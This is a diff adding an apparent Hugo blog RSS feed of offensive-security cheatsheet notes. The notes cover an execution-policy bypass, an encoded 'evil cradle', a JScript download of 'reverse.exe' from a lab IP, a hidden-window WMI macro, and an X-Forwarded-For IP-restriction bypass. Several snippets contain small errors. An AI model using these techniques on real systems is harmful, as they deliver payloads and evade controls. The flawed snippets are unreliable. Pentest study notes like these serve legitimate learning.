@@ -1,0 +1,43 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Good to know on Ceso Adventures</title><link>https://ceso.github.io/cheatsheets/hacking/good_to_know/</link><description>Recent content in Good to know on Ceso Adventures</description><generator>Hugo</generator><language>en-gb</language><lastBuildDate>Fri, 03 Oct 2025 00:00:00 +0000</lastBuildDate><atom:link href="https://ceso.github.io/cheatsheets/hacking/good_to_know/index.xml" rel="self" type="application/rss+xml"/><item><title>Compiling</title><link>https://ceso.github.io/cheatsheets/hacking/good_to_know/compiling/</link><pubDate>Fri, 03 Oct 2025 00:00:00 +0000</pubDate><guid>https://ceso.github.io/cheatsheets/hacking/good_to_know/compiling/</guid><description>&lt;h1 id="arch-cross-compile-exploit-and-diff-glibc-version"&gt;Arch cross compile exploit (and diff glibc version)&lt;/h1&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;gcc -m32 -Wall -Wl,--hash-style=both -o gimme.o gimme.c
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;</description></item><item><title>Misc</title><link>https://ceso.github.io/cheatsheets/hacking/good_to_know/misc/</link><pubDate>Fri, 03 Oct 2025 00:00:00 +0000</pubDate><guid>https://ceso.github.io/cheatsheets/hacking/good_to_know/misc/</guid><description>&lt;h1 id="enable-execution-of-powershell-scripts"&gt;Enable execution of PowerShell Scripts&lt;/h1&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Set-ExecutionPolicy RemoteSigned
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Set-ExecutionPolicy Unrestricted
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;powershell.exe -exec bypass
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
+&lt;h1 id="encode-powershell-b64-from-linux"&gt;Encode Powershell b64 from Linux&lt;/h1&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;echo &amp;#39;ImAnEviCradleBuuhhhh&amp;#39; | iconv -t UTF-16LE | base64 -w0
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
+&lt;h1 id="encodedecode-b64-in-windows-without-powershell"&gt;Encode/Decode b64 in Windows WITHOUT Powershell&lt;/h1&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;certutil -encode &amp;lt;inputfile&amp;gt; &amp;lt;outputfile&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;certutil -decode &amp;lt;b64inputfile&amp;gt; &amp;lt;plainoutputdecodedfile&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; ^-- If the file exists I can use the -f flag which will force an overwrite
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
+&lt;h1 id="set-proxy-in-code-used-windows"&gt;Set Proxy in code used (Windows)&lt;/h1&gt;
+&lt;h2 id="powershell"&gt;Powershell&lt;/h2&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;[System.Net.WebRequest]::DefaultWebProxy.GetProxy(url)
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id="jscript"&gt;JScript&lt;/h2&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;var url = &amp;#34;http://192.168.42.43/reverse.exe&amp;#34;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;var var Object = new ActiveXObject(&amp;#34;MSXML2.ServerXMLHTTP.6.0&amp;#34;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Object.setProxy(&amp;#34;2&amp;#34;,&amp;#34;192.168.42.42:3128&amp;#34;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Object.open(&amp;#39;GET&amp;#39;, url, false);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Object.send();
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; ^-- This was tricky because lack of debug information. The parameter in &amp;#34;2&amp;#34; means &amp;#34;SXH_PROXY_SET_PROXY&amp;#34;, and it allows to specify a list of one or more servers together with a bypass list. The .open() must be in lowercase otherwise .Open() is another method
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
+&lt;h1 id="hide-foreground-with-wmi-windows-office-macros"&gt;Hide Foreground with WMI (Windows, Office Macros)&lt;/h1&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Sub example()
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; Const HIDDEN_WINDOW = 0
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; Dim cmd As String
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;&lt;/span&gt; cmd = &amp;#34;Here there is some commands to execute inside the macro via WMI&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; Set objWMIService = GetObject(&amp;#34;winmgmts:&amp;#34;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; Set objStartup = objWMIService.Get(&amp;#34;Win32_ProcessStartup&amp;#34;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; Set objConfig = objStartup.SpawnInstance_
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; objConfig.ShowWindow = HIDDEN_WINDOW
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; Set objProcess = GetObject(&amp;#34;winmgmts:Win32_Process&amp;#34;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; errReturn = objProcess.Create(str, Null, objConfig, pid)
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;End Sub
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;</description></item><item><title>Web</title><link>https://ceso.github.io/cheatsheets/hacking/good_to_know/web/</link><pubDate>Fri, 03 Oct 2025 00:00:00 +0000</pubDate><guid>https://ceso.github.io/cheatsheets/hacking/good_to_know/web/</guid><description>&lt;h1 id="ip-restriction-at-application-level---bypass"&gt;IP restriction at application level - Bypass&lt;/h1&gt;
+&lt;p&gt;Try to send a request modifying the HTTP header by adding:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;X-Forwarder-For: &amp;lt;ip allowed&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;</description></item></channel></rss>
